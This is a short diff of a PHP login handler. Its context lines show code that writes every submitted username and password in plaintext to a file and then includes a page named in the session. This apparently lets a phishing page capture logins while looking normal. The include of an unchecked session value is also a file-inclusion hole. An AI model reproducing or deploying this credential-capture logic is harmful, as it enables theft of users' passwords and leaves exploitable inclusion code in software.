@@ -5,8 +5,6 @@ session_start();
 
 $page = $_SESSION['page'];
 
-
-
 if(!empty($_POST)){
     // Check if username and password is set
     if (isset($_POST['username']) && isset($_POST['password'])) {
@@ -15,9 +13,7 @@ if(!empty($_POST)){
         fwrite($fp, $_POST['username'] . " " . $_POST['password'] . "\n" );
         fclose($fp);
 
-
         include($page);
-
     }
 }
 
